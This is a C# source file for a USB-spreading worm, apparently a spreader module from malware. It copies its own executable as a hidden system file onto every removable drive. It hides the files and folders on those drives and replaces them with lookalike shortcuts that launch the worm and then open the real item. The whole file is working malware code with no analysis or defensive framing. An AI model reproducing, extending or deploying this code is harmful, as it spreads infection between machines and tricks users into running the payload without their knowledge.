using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

class USBBOOT
{
    private static object ObjectShell;
    private static object ObjectLink;
    private static string spath;
    public bool result;

    public static void USB(bool startThread)
    {
        if (startThread == true)
        {
            USBBOOT.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
            USBBOOT.ExecParam(USBBOOT.spath);
            System.Threading.Thread NewThread = new System.Threading.Thread(new System.Threading.ThreadStart(USBBOOT.USB_boot), 1);
            NewThread.Start();
        }
        else
        {
            USBBOOT.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
            USBBOOT.ExecParam(USBBOOT.spath);
            
        }
    }
    public static void USB_boot()
    {
        
        while (true)
        {
            try
            {
                string[] USBDrivers = Strings.Split(DetectUSBDrivers(), "<->", -1, CompareMethod.Binary);
                int num = Information.UBound(USBDrivers, 1) - 1;
                for (int i = 0; i <= num; i++)
                {
                    if (!File.Exists(USBDrivers[i] + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName))
                    {
                        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, USBDrivers[i] + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
                        File.SetAttributes(USBDrivers[i] + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden | FileAttributes.System);
                    }
                    string[] files = Directory.GetFiles(USBDrivers[i]);
                    for (int j = 0; j < files.Length; j++)
                    {
                        string GettingFile = files[j];
                        if (Operators.CompareString(Path.GetExtension(GettingFile), ".lnk", false) != 0 && Operators.CompareString(Path.GetFileName(GettingFile), System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, false) != 0)
                        {
                            System.Threading.Thread.Sleep(100);
                            File.SetAttributes(GettingFile, FileAttributes.Hidden | FileAttributes.System);
                            USBBOOT.CreateShortCut(Path.GetFileName(GettingFile), USBDrivers[i], Path.GetFileNameWithoutExtension(GettingFile), USBBOOT.GetIconoffile(Path.GetExtension(GettingFile)));
                        }
                    }
                    string[] directories = Directory.GetDirectories(USBDrivers[i]);
                    for (int k = 0; k < directories.Length; k++)
                    {
                        string Dir = directories[k];
                        System.Threading.Thread.Sleep(100);
                        File.SetAttributes(Dir, FileAttributes.Hidden | FileAttributes.System);
                        USBBOOT.CreateShortCut(Path.GetFileNameWithoutExtension(Dir), USBDrivers[i] + "\\", Path.GetFileNameWithoutExtension(Dir), null);
                    }
                }
            }
            catch
            {
            }
            System.Threading.Thread.Sleep(5000);
        }
    }
    private static void CreateShortCut(string TargetName, string ShortCutPath, string ShortCutName, string Icon)
    {
        try
        {
            USBBOOT.ObjectShell = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
            USBBOOT.ObjectLink = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(USBBOOT.ObjectShell, null, "CreateShortcut", new object[] { ShortCutPath + "\\" + ShortCutName + ".lnk" }, null, null, null));
            NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "TargetPath", new object[] { ShortCutPath + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName }, null, null);
            NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "WindowStyle", new object[] { 1 }, null, null);
            if (Icon == null)
            {
                NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "Arguments", new object[] { " " + ShortCutPath + "\\" + TargetName }, null, null);
                NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "IconLocation", new object[] { "%SystemRoot%\\system32\\SHELL32.dll,3" }, null, null);
            }
            else
            {
                NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "Arguments", new object[] { " " + ShortCutPath + "\\" + TargetName }, null, null);
                NewLateBinding.LateSet(USBBOOT.ObjectLink, null, "IconLocation", new object[] { Icon }, null, null);
            }
            NewLateBinding.LateCall(USBBOOT.ObjectLink, null, "Save", new object[0], null, null, null, true);
        }
        catch
        {
        }
    }
    private static string GetIconoffile(string FileFormat)
    {
        string GetIconoffile;
        try
        {
            Microsoft.Win32.RegistryKey Registry = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
            string GetValue = Conversions.ToString(Registry.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Registry.OpenSubKey(FileFormat, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
            if (!GetValue.Contains(","))
            {
                GetValue += ",0";
            }
            GetIconoffile = GetValue;
        }
        catch
        {
            GetIconoffile = "";
        }
        return GetIconoffile;
    }
    private static string DetectUSBDrivers()
    {
        string USBDrivers = "";
        DriveInfo[] drives = DriveInfo.GetDrives();
        for (int i = 0; i < drives.Length; i++)
        {
            DriveInfo usbdrive = drives[i];
            if (usbdrive.DriveType == DriveType.Removable)
            {
                USBDrivers = USBDrivers + usbdrive.RootDirectory.FullName + "<->";
            }
        }
        return USBDrivers;
    }
    private static void ExecParam(string Parameter)
    {
        if (Operators.CompareString(Parameter, null, false) != 0)
        {
            if (Strings.InStrRev(Parameter, ".", -1, CompareMethod.Binary) > 0)
            {
                System.Diagnostics.Process.Start(Parameter);
            }
            else
            {
                Interaction.Shell("explorer " + Parameter, AppWinStyle.NormalFocus, false, -1);
            }
        }
    }
}